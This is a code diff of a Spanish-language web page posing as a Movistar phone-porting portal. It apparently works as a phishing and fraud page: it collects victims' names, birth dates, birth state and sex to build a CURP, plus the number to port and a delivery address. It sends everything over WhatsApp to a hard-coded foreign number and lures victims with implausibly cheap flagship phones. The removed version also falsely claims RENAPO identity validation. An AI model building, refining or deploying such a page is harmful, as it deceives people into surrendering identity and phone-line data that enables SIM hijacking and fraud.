@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Movistar Elite | Registro Nacional de Portabilidad</title>
+    <title>Movistar Elite | Portal de Portabilidad y Entrega</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -21,230 +21,280 @@
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
         body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; }
         .stage { display: none; }
-        .stage.active { display: block; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        input, select { border: 2px solid #e2e8f0 !important; transition: all 0.3s; }
-        input:focus, select:focus { border-color: #019DF0 !important; box-shadow: 0 0 0 4px rgba(1, 157, 240, 0.1) !important; outline: none; }
+        .stage.active { display: block; animation: slideIn 0.4s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.2); }
+        select, input { border: 2px solid #e2e8f0 !important; }
+        select:focus, input:focus { border-color: #019DF0 !important; outline: none; box-shadow: 0 0 0 4px rgba(1, 157, 240, 0.1); }
     </style>
 </head>
-<body class="antialiased">
+<body class="antialiased text-slate-900">
 
-    <header class="bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-slate-100">
+    <header class="glass sticky top-0 z-50 border-b border-slate-200">
         <div class="container mx-auto px-6 py-4 flex justify-between items-center">
             <div class="flex items-center gap-2">
-                <div class="w-9 h-9 bg-movistar-blue rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
-                    <i class="fas fa-id-card text-white text-sm"></i>
+                <div class="w-9 h-9 bg-movistar-blue rounded-xl flex items-center justify-center shadow-lg">
+                    <i class="fas fa-sim-card text-white"></i>
                 </div>
-                <span class="font-black text-xl tracking-tighter italic uppercase text-slate-800">Movistar <span class="text-movistar-blue">Elite</span></span>
+                <span class="font-black text-xl tracking-tighter italic uppercase">Movistar <span class="text-movistar-blue">Elite</span></span>
             </div>
-            <div class="hidden md:block text-[10px] font-black text-slate-400 tracking-widest uppercase">Validación de Identidad RENAPO 2026</div>
+            <div class="flex items-center gap-4">
+                <span class="hidden md:block text-[10px] font-black text-slate-400 uppercase tracking-widest">Portal de Portabilidad 2026</span>
+                <div class="w-2 h-2 bg-movistar-green rounded-full animate-pulse"></div>
+            </div>
         </div>
     </header>
 
-    <main class="max-w-7xl mx-auto py-8 px-4">
+    <main class="max-w-6xl mx-auto py-10 px-6">
         
         <section id="stage-1" class="stage active">
-            <div class="max-w-2xl mx-auto bg-white rounded-[2.5rem] p-8 md:p-12 shadow-2xl shadow-slate-200">
+            <div class="max-w-xl mx-auto glass rounded-[2.5rem] p-10 shadow-2xl">
                 <div class="text-center mb-10">
-                    <span class="bg-blue-50 text-movistar-blue text-[10px] font-black px-4 py-2 rounded-full uppercase tracking-[0.2em]">Paso 1: Identificación Civil</span>
-                    <h2 class="text-3xl font-extrabold text-slate-900 mt-4">Valida tu Beneficio</h2>
-                    <p class="text-slate-500 font-medium">Calcularemos tu CURP automáticamente para verificar tu elegibilidad.</p>
+                    <span class="bg-blue-100 text-movistar-blue text-[10px] font-black px-4 py-2 rounded-full uppercase italic">Paso 01: Identidad Digital</span>
+                    <h2 class="text-3xl font-black mt-4 text-slate-800 italic uppercase leading-none">Valida tu CURP</h2>
+                    <p class="text-slate-500 font-medium mt-2">Calcularemos tu clave para la aprobación inmediata.</p>
                 </div>
-
-                <form id="form-identity" class="grid grid-cols-1 md:grid-cols-2 gap-5">
-                    <div class="md:col-span-2">
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Nombre(s)</label>
-                        <input type="text" id="p-nombre" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="Ej. JUAN CARLOS">
+                
+                <form id="id-form" class="space-y-5">
+                    <input type="text" id="nom" required placeholder="Nombre(s)" class="w-full p-4 rounded-xl font-bold uppercase">
+                    <div class="grid grid-cols-2 gap-4">
+                        <input type="text" id="pat" required placeholder="A. Paterno" class="w-full p-4 rounded-xl font-bold uppercase">
+                        <input type="text" id="mat" required placeholder="A. Materno" class="w-full p-4 rounded-xl font-bold uppercase">
                     </div>
-                    <div>
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Apellido Paterno</label>
-                        <input type="text" id="p-paterno" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="PATERNO">
-                    </div>
-                    <div>
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Apellido Materno</label>
-                        <input type="text" id="p-materno" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="MATERNO">
-                    </div>
-                    <div>
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Fecha de Nacimiento</label>
-                        <input type="date" id="p-fecha" required class="w-full p-4 rounded-xl font-bold">
-                    </div>
-                    <div>
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Estado de Nacimiento</label>
-                        <select id="p-estado" required class="w-full p-4 rounded-xl font-bold">
-                            <option value="">SELECCIONAR...</option>
-                            <option value="AS">AGUASCALIENTES</option><option value="BC">BAJA CALIFORNIA</option>
-                            <option value="BS">BAJA CALIFORNIA SUR</option><option value="CC">CAMPECHE</option>
-                            <option value="CL">COAHUILA</option><option value="CM">COLIMA</option>
-                            <option value="CS">CHIAPAS</option><option value="CH">CHIHUAHUA</option>
-                            <option value="DF">CIUDAD DE MÉXICO</option><option value="DG">DURANGO</option>
-                            <option value="GT">GUANAJUATO</option><option value="GR">GUERRERO</option>
-                            <option value="HG">HIDALGO</option><option value="JC">JALISCO</option>
-                            <option value="MC">MÉXICO</option><option value="MN">MICHOACÁN</option>
-                            <option value="MS">MORELOS</option><option value="NT">NAYARIT</option>
-                            <option value="NL">NUEVO LEÓN</option><option value="OC">OAXACA</option>
-                            <option value="PL">PUEBLA</option><option value="QT">QUERÉTARO</option>
-                            <option value="QR">QUINTANA ROO</option><option value="SP">SAN LUIS POTOSÍ</option>
-                            <option value="SL">SINALOA</option><option value="SR">SONORA</option>
-                            <option value="TC">TABASCO</option><option value="TS">TAMAULIPAS</option>
-                            <option value="TL">TLAXCALA</option><option value="VZ">VERACRUZ</option>
-                            <option value="YN">YUCATÁN</option><option value="ZS">ZACATECAS</option>
-                            <option value="NE">NACIDO EN EL EXTRANJERO</option>
+                    <div class="grid grid-cols-2 gap-4">
+                        <input type="date" id="fec" required class="w-full p-4 rounded-xl font-bold text-slate-500">
+                        <select id="est" required class="w-full p-4 rounded-xl font-bold">
+                            <option value="">Estado Nac.</option>
+                            <option value="AS">Aguascalientes</option><option value="BC">Baja California</option><option value="BS">Baja California Sur</option>
+                            <option value="CC">Campeche</option><option value="CH">Chihuahua</option><option value="CL">Coahuila</option>
+                            <option value="CM">Colima</option><option value="CS">Chiapas</option><option value="DF">Ciudad de México</option>
+                            <option value="DG">Durango</option><option value="GR">Guerrero</option><option value="GT">Guanajuato</option>
+                            <option value="HG">Hidalgo</option><option value="JC">Jalisco</option><option value="MC">México</option>
+                            <option value="MN">Michoacán</option><option value="MS">Morelos</option><option value="NT">Nayarit</option>
+                            <option value="NL">Nuevo León</option><option value="OC">Oaxaca</option><option value="PL">Puebla</option>
+                            <option value="QT">Querétaro</option><option value="QR">Quintana Roo</option><option value="SL">Sinaloa</option>
+                            <option value="SP">San Luis Potosí</option><option value="SR">Sonora</option><option value="TC">Tabasco</option>
+                            <option value="TL">Tlaxcala</option><option value="TS">Tamaulipas</option><option value="VZ">Veracruz</option>
+                            <option value="YN">Yucatán</option><option value="ZS">Zacatecas</option>
                         </select>
                     </div>
-                    <div class="md:col-span-2">
-                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Género</label>
-                        <div class="flex gap-4 mt-2">
-                            <label class="flex-1 border p-4 rounded-xl cursor-pointer hover:bg-slate-50 flex items-center gap-2">
-                                <input type="radio" name="genero" value="H" required> <span class="font-bold">HOMBRE</span>
-                            </label>
-                            <label class="flex-1 border p-4 rounded-xl cursor-pointer hover:bg-slate-50 flex items-center gap-2">
-                                <input type="radio" name="genero" value="M" required> <span class="font-bold">MUJER</span>
-                            </label>
-                        </div>
+                    <div class="flex gap-4">
+                        <label class="flex-1 cursor-pointer"><input type="radio" name="sex" value="H" class="hidden peer" required><div class="p-4 text-center rounded-xl border-2 peer-checked:border-movistar-blue peer-checked:bg-blue-50 font-bold transition-all">Hombre</div></label>
+                        <label class="flex-1 cursor-pointer"><input type="radio" name="sex" value="M" class="hidden peer"><div class="p-4 text-center rounded-xl border-2 peer-checked:border-movistar-blue peer-checked:bg-blue-50 font-bold transition-all">Mujer</div></label>
                     </div>
-                    <button type="submit" class="md:col-span-2 bg-movistar-blue text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-transform">
-                        CALCULAR CURP Y CONTINUAR
+                    <button type="submit" class="w-full bg-movistar-blue text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-transform uppercase italic">
+                        Continuar <i class="fas fa-arrow-right ml-2 text-sm"></i>
                     </button>
                 </form>
             </div>
         </section>
 
         <section id="stage-2" class="stage">
-            <div class="mb-10 text-center">
-                <h3 class="text-2xl font-black text-slate-800 italic uppercase">Equipos Disponibles para tu CURP</h3>
-                <div id="curp-display" class="inline-block bg-movistar-blue/10 text-movistar-blue font-mono px-4 py-2 rounded-lg mt-2 font-bold tracking-widest border border-movistar-blue/20"></div>
+            <div class="flex flex-col md:flex-row justify-between items-end mb-10 gap-6">
+                <div>
+                    <h2 class="text-4xl font-black italic uppercase italic tracking-tighter">Ofertas <span class="text-movistar-blue">Portabilidad</span></h2>
+                    <p id="curp-info" class="text-movistar-blue font-bold text-sm tracking-widest mt-2 uppercase"></p>
+                </div>
+                <div class="relative w-full md:w-80">
+                    <i class="fas fa-search absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"></i>
+                    <input type="text" id="search" placeholder="Buscar equipo..." class="w-full p-4 pl-12 rounded-2xl border-none shadow-xl focus:ring-2 ring-movistar-blue font-bold">
+                </div>
             </div>
             <div id="grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
         </section>
 
-        <section id="stage-3" class="stage max-w-5xl mx-auto">
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="bg-white rounded-[2rem] p-8 shadow-xl">
-                    <img id="res-img" src="" class="h-64 mx-auto object-contain mb-6 drop-shadow-2xl">
-                    <h4 id="res-name" class="text-2xl font-black text-slate-900 uppercase italic"></h4>
-                    <p id="res-total" class="text-3xl font-black text-movistar-blue mt-4"></p>
+        <section id="stage-3" class="stage">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+                <div class="lg:col-span-4 glass rounded-[2.5rem] p-8 text-center shadow-xl border-2 border-movistar-blue/10">
+                    <img id="f-img" src="" class="h-60 mx-auto object-contain mb-6 drop-shadow-2xl">
+                    <h3 id="f-name" class="text-2xl font-black uppercase italic leading-none text-slate-800"></h3>
+                    <div id="f-price" class="text-3xl font-black text-movistar-blue mt-4"></div>
                 </div>
-                <div class="bg-slate-900 rounded-[2rem] p-8 text-white">
-                    <h5 class="text-sm font-black text-slate-400 uppercase tracking-widest mb-6">Confirmar Portabilidad</h5>
-                    <form id="form-final" class="space-y-4">
-                        <input type="tel" id="port-num" required placeholder="Número a Portar (10 dígitos)" class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold" maxlength="10">
-                        <select id="term" class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold" onchange="App.updatePrice()">
-                            <option value="1">PAGO DE CONTADO</option>
-                            <option value="6">6 MESES SIN INTERESES</option>
-                            <option value="12">12 MESES SIN INTERESES</option>
-                            <option value="24">24 MESES SIN INTERESES</option>
-                        </select>
-                        <textarea id="address" required placeholder="Dirección Completa de Entrega..." class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold resize-none" rows="3"></textarea>
-                        <button type="submit" class="w-full bg-movistar-green py-5 rounded-xl font-black uppercase italic tracking-widest hover:bg-green-600 transition-colors">
-                            ENVIAR PEDIDO VÍA WHATSAPP <i class="fab fa-whatsapp ml-2"></i>
-                        </button>
+
+                <div class="lg:col-span-8 bg-white rounded-[2.5rem] p-8 md:p-12 shadow-2xl">
+                    <form id="final-form" class="space-y-8">
+                        <div>
+                            <h4 class="text-sm font-black uppercase text-movistar-blue mb-4"><i class="fas fa-map-marker-alt mr-2"></i> Método de Entrega</h4>
+                            <div class="grid grid-cols-2 gap-4">
+                                <label class="cursor-pointer"><input type="radio" name="metodo" value="SUCURSAL" class="hidden peer" checked onchange="App.toggleLogistics()"><div class="p-5 rounded-2xl border-2 text-center peer-checked:border-movistar-blue peer-checked:bg-blue-50 transition-all font-bold">Retiro en Sucursal</div></label>
+                                <label class="cursor-pointer"><input type="radio" name="metodo" value="DOMICILIO" class="hidden peer" onchange="App.toggleLogistics()"><div class="p-5 rounded-2xl border-2 text-center peer-checked:border-movistar-blue peer-checked:bg-blue-50 transition-all font-bold">Envío a Domicilio</div></label>
+                            </div>
+                        </div>
+
+                        <div id="box-sucursal" class="space-y-4">
+                            <h4 class="text-sm font-black uppercase text-movistar-blue mb-2">Selecciona tu Centro Movistar</h4>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <select id="s-estado" class="w-full p-4 rounded-xl font-bold bg-slate-50 border-none ring-1 ring-slate-200" onchange="App.updateSucursales()">
+                                    <option value="">Estado para retiro...</option>
+                                </select>
+                                <select id="s-sucursal" class="w-full p-4 rounded-xl font-bold bg-slate-50 border-none ring-1 ring-slate-200">
+                                    <option value="">Primero elige un estado...</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div id="box-domicilio" class="hidden space-y-4">
+                            <h4 class="text-sm font-black uppercase text-movistar-blue mb-2">Dirección de Envío</h4>
+                            <textarea id="f-addr" placeholder="Calle, número, colonia, CP y referencias..." class="w-full p-4 rounded-xl bg-slate-50 border-none ring-1 ring-slate-200 font-bold resize-none" rows="3"></textarea>
+                        </div>
+
+                        <div class="pt-6 border-t">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                                <input type="tel" id="f-phone" required placeholder="Número a portar (10 dígitos)" maxlength="10" class="w-full p-4 rounded-xl bg-slate-50 border-none ring-1 ring-slate-200 font-bold">
+                                <select id="f-meses" class="w-full p-4 rounded-xl font-bold bg-slate-50 border-none ring-1 ring-slate-200">
+                                    <option value="1">PAGO DE CONTADO</option>
+                                    <option value="12">12 MESES SIN INTERESES</option>
+                                    <option value="24">24 MESES SIN INTERESES</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="w-full bg-movistar-green text-white py-6 rounded-2xl font-black text-xl italic shadow-xl shadow-green-500/30 flex items-center justify-center gap-3 hover:scale-[1.01] transition-all">
+                                SOLICITAR EQUIPO VÍA WHATSAPP <i class="fab fa-whatsapp text-2xl"></i>
+                            </button>
+                        </div>
                     </form>
                 </div>
             </div>
         </section>
-
     </main>
 
     <script>
         const WHATSAPP_NUM = "584124676073";
+        const markup = 1.15;
         const fmt = new Intl.NumberFormat('es-MX', { style: 'currency', currency: 'MXN' });
-        const up = (p) => Math.round(p * 1.15);
+
+        // Directorio de Sucursales extraído del PDF
+        const SUCURSALES_DB = {
+            "AGUASCALIENTES": ["PLAZA VELARIA MALL", "PLAZA VILLA ASUNCION", "BOSQUES AGUASCALIENTES"],
+            "BAJA CALIFORNIA": ["PLAZA CACHANILLA", "MACROPLAZA TIJUANA", "PLAZA RIO TIJUANA", "PLAZA SENDERO ENSENADA"],
+            "CHIHUAHUA": ["PLAZA DEL SOL CHIHUAHUA", "PLAZA LAS MISIONES CD JUAREZ", "LIBERTAD CHIHUAHUA"],
+            "CIUDAD DE MÉXICO": ["PLAZA CARSO", "PARQUE DELTA", "FORUM BUENAVISTA", "CENTRO COMERCIAL SANTA FE", "PLAZA ORIENTE"],
+            "GUANAJUATO": ["PLAZA MAYOR LEON", "CENTRO MAX LEON", "PLAZA CIBELES IRAPUATO"],
+            "JALISCO": ["PLAZA DEL SOL GUADALAJARA", "GALERIAS GUADALAJARA", "FORUM TLAQUEPAQUE", "PLAZA PATRIA"],
+            "MÉXICO": ["PLAZA SATELITE", "MUNDO E", "GALERIAS TOLUCA", "PLAZA SENDERO IXTAPALUCA"],
+            "NUEVO LEÓN": ["GALERIAS MONTERREY", "PLAZA FIESTA SAN AGUSTIN", "PASEO LA FE", "PLAZA CUMBRES"],
+            "PUEBLA": ["ANGELOPOLIS", "PLAZA DORADA PUEBLA", "GALERIAS SERDAN"],
+            "QUERÉTARO": ["ANTEA LIFESTYLE CENTER", "GALERIAS QUERETARO", "PLAZA DEL PARQUE"],
+            "VERACRUZ": ["PLAZA AMERICAS BOCA DEL RIO", "PLAZA CRISTAL XALAPA", "ANDAMAR"],
+            "YUCATÁN": ["MACROPLAZA MERIDA", "GRAN PLAZA MERIDA", "MERIDA 56 CENTRO"]
+        };
 
         const database = [
-            { id: 101, name: "Nubia Neo 3 GT 5G", brand: "ZTE", price: up(1899), img: "https://placehold.co/600x600/0f172a/019DF0/png?text=Nubia+Neo+3+GT" },
-            { id: 1, name: "iPhone 17 Pro Max", brand: "Apple", price: up(5499), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif" },
-            { id: 2, name: "Galaxy S24 Ultra", brand: "Samsung", price: up(4999), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif" },
-            { id: 7, name: "Xiaomi 13T Pro", brand: "Xiaomi", price: up(2899), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif" },
-            { id: 8, name: "Motorola Edge 40 Pro", brand: "Motorola", price: up(2599), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif" }
+            { id: 1, name: "iPhone 17 Pro Max", brand: "Apple", price: 5499, img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif" },
+            { id: 2, name: "Galaxy S24 Ultra", brand: "Samsung", price: 4999, img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif" },
+            { id: 3, name: "ZTE Nubia Neo 3 GT", brand: "ZTE", price: 1899, img: "https://placehold.co/400x400/0f172a/019DF0/png?text=Nubia+Neo+3+GT" },
+            { id: 4, name: "Xiaomi 13T Pro", brand: "Xiaomi", price: 2899, img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif" },
+            { id: 5, name: "Motorola Edge 40 Pro", brand: "Motorola", price: 2599, img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif" },
+            { id: 6, name: "Galaxy Z Fold 5", brand: "Samsung", price: 6200, img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/Galaxy%20Z%20Fold%205.jfif" }
         ];
 
         const App = {
-            state: { curp: '', device: null, userData: {} },
+            state: { curp: '', user: {}, selected: null },
 
             init() {
-                document.getElementById('form-identity').onsubmit = (e) => {
-                    e.preventDefault();
-                    this.calculateCURP();
-                };
-                document.getElementById('form-final').onsubmit = this.sendWhatsapp.bind(this);
+                document.getElementById('id-form').onsubmit = (e) => { e.preventDefault(); this.genCURP(); };
+                document.getElementById('search').oninput = (e) => this.render(e.target.value);
+                document.getElementById('final-form').onsubmit = (e) => { e.preventDefault(); this.send(); };
+                
+                // Cargar estados en el selector de sucursales
+                const estSel = document.getElementById('s-estado');
+                Object.keys(SUCURSALES_DB).sort().forEach(est => {
+                    const opt = document.createElement('option');
+                    opt.value = est; opt.innerText = est;
+                    estSel.appendChild(opt);
+                });
+
                 this.render();
             },
 
-            calculateCURP() {
-                const nombre = document.getElementById('p-nombre').value.toUpperCase().trim();
-                const paterno = document.getElementById('p-paterno').value.toUpperCase().trim();
-                const materno = document.getElementById('p-materno').value.toUpperCase().trim();
-                const fecha = document.getElementById('p-fecha').value; // YYYY-MM-DD
-                const estado = document.getElementById('p-estado').value;
-                const genero = document.querySelector('input[name="genero"]:checked').value;
+            genCURP() {
+                const n = document.getElementById('nom').value.toUpperCase().trim();
+                const p = document.getElementById('pat').value.toUpperCase().trim();
+                const m = document.getElementById('mat').value.toUpperCase().trim();
+                const f = document.getElementById('fec').value;
+                const e = document.getElementById('est').value;
+                const s = document.querySelector('input[name="sex"]:checked').value;
 
-                // Lógica de extracción (Simplificada según Norma Oficial)
-                const getVocal = (s) => s.substring(1).match(/[AEIOU]/)?.[0] || 'X';
-                const getConsonante = (s) => s.substring(1).match(/[BCDFGHJKLMNPQRSTVWXYZ]/)?.[0] || 'X';
+                const gV = (x) => x.substring(1).match(/[AEIOU]/)?.[0] || 'X';
+                const gC = (x) => x.substring(1).match(/[BCDFGHJKLMNPQRSTVWXYZ]/)?.[0] || 'X';
 
-                let curp = paterno[0] + getVocal(paterno) + materno[0] + nombre[0];
-                curp += fecha.substring(2, 4) + fecha.substring(5, 7) + fecha.substring(8, 10);
-                curp += genero + estado;
-                curp += getConsonante(paterno) + getConsonante(materno) + getConsonante(nombre);
+                let c = p[0] + gV(p) + m[0] + n[0] + f.substring(2,4) + f.substring(5,7) + f.substring(8,10) + s + e + gC(p) + gC(m) + gC(n) + "A1";
                 
-                // Homoclave simulada profesional
-                curp += "A" + Math.floor(Math.random() * 9); 
-
-                this.state.curp = curp;
-                this.state.userData = { nombre, paterno, materno, curp };
-                
-                document.getElementById('curp-display').innerText = `CURP: ${curp}`;
-                this.showStage(2);
+                this.state.curp = c;
+                this.state.user = { n, p, m };
+                document.getElementById('curp-info').innerText = `IDENTIDAD: ${c}`;
+                this.goTo(2);
             },
 
-            showStage(n) {
-                document.querySelectorAll('.stage').forEach(s => s.classList.remove('active'));
-                document.getElementById(`stage-${n}`).classList.add('active');
-                window.scrollTo({top: 0, behavior: 'smooth'});
-            },
-
-            render() {
-                const grid = document.getElementById('grid');
-                grid.innerHTML = database.map(d => `
-                    <div onclick="App.select(${d.id})" class="bg-white p-6 rounded-[2rem] shadow-lg cursor-pointer hover:border-movistar-blue border-2 border-transparent transition-all group">
+            render(filter = '') {
+                const g = document.getElementById('grid');
+                const items = database.filter(d => d.name.toLowerCase().includes(filter.toLowerCase()));
+                g.innerHTML = items.map(d => `
+                    <div onclick="App.select(${d.id})" class="glass p-5 rounded-[2rem] border-2 border-transparent hover:border-movistar-blue transition-all cursor-pointer group shadow-lg">
                         <img src="${d.img}" class="h-40 mx-auto object-contain mb-4 group-hover:scale-105 transition-transform">
+                        <p class="text-[9px] font-black text-movistar-blue uppercase tracking-widest">${d.brand}</p>
                         <h4 class="font-black text-slate-800 text-sm italic uppercase">${d.name}</h4>
-                        <p class="text-xl font-black text-movistar-blue mt-2">${fmt.format(d.price)}</p>
+                        <p class="text-xl font-black text-slate-900 mt-2">${fmt.format(Math.round(d.price * markup))}</p>
                     </div>
                 `).join('');
             },
 
             select(id) {
-                this.state.device = database.find(d => d.id === id);
-                document.getElementById('res-img').src = this.state.device.img;
-                document.getElementById('res-name').innerText = this.state.device.name;
-                this.updatePrice();
-                this.showStage(3);
+                this.state.selected = database.find(x => x.id === id);
+                document.getElementById('f-img').src = this.state.selected.img;
+                document.getElementById('f-name').innerText = this.state.selected.name;
+                document.getElementById('f-price').innerText = fmt.format(Math.round(this.state.selected.price * markup));
+                this.goTo(3);
             },
 
-            updatePrice() {
-                const total = this.state.device.price + up(100);
-                document.getElementById('res-total').innerText = fmt.format(total);
+            toggleLogistics() {
+                const met = document.querySelector('input[name="metodo"]:checked').value;
+                document.getElementById('box-sucursal').classList.toggle('hidden', met !== 'SUCURSAL');
+                document.getElementById('box-domicilio').classList.toggle('hidden', met !== 'DOMICILIO');
             },
 
-            sendWhatsapp(e) {
-                e.preventDefault();
-                const d = this.state.device;
-                const user = this.state.userData;
-                const port = document.getElementById('port-num').value;
-                const term = document.getElementById('term').value;
-                const addr = document.getElementById('address').value;
+            updateSucursales() {
+                const est = document.getElementById('s-estado').value;
+                const sucSel = document.getElementById('s-sucursal');
+                sucSel.innerHTML = '<option value="">Selecciona Sucursal...</option>';
+                if(SUCURSALES_DB[est]) {
+                    SUCURSALES_DB[est].forEach(s => {
+                        const opt = document.createElement('option');
+                        opt.value = s; opt.innerText = s;
+                        sucSel.appendChild(opt);
+                    });
+                }
+            },
 
-                const msg = `*REGISTRO PORTABILIDAD ELITE*%0A` +
-                            `*CURP:* ${user.curp}%0A` +
-                            `*Nombre:* ${user.nombre} ${user.paterno} ${user.materno}%0A` +
+            goTo(n) {
+                document.querySelectorAll('.stage').forEach(s => s.classList.remove('active'));
+                document.getElementById(`stage-${n}`).classList.add('active');
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            },
+
+            send() {
+                const d = this.state.selected;
+                const u = this.state.user;
+                const met = document.querySelector('input[name="metodo"]:checked').value;
+                const sucursal = document.getElementById('s-sucursal').value;
+                const estadoSuc = document.getElementById('s-estado').value;
+                const addr = document.getElementById('f-addr').value;
+                const phone = document.getElementById('f-phone').value;
+                const meses = document.getElementById('f-meses').value;
+
+                let logistica = met === 'SUCURSAL' ? `*Retiro:* ${sucursal} (${estadoSuc})` : `*Envío:* ${addr}`;
+
+                const msg = `*NUEVA PORTABILIDAD MOVISTAR*%0A` +
+                            `*Folio CURP:* ${this.state.curp}%0A` +
+                            `*Cliente:* ${u.n} ${u.p} ${u.m}%0A` +
+                            `*Línea:* ${phone}%0A` +
                             `--------------------------------%0A` +
                             `*Equipo:* ${d.name}%0A` +
-                            `*Número Portar:* ${port}%0A` +
-                            `*Financiamiento:* ${term} meses%0A` +
-                            `*Dirección:* ${addr}%0A` +
+                            `*Precio:* ${fmt.format(Math.round(d.price * markup))}%0A` +
+                            `*Plazo:* ${meses} Meses%0A` +
                             `--------------------------------%0A` +
-                            `_Validación Automática RENAPO Exitosa_`;
+                            `${logistica}%0A` +
+                            `--------------------------------%0A` +
+                            `_Favor de validar stock y generar orden._`;
 
                 window.open(`https://api.whatsapp.com/send?phone=${WHATSAPP_NUM}&text=${msg}`, '_blank');
             }
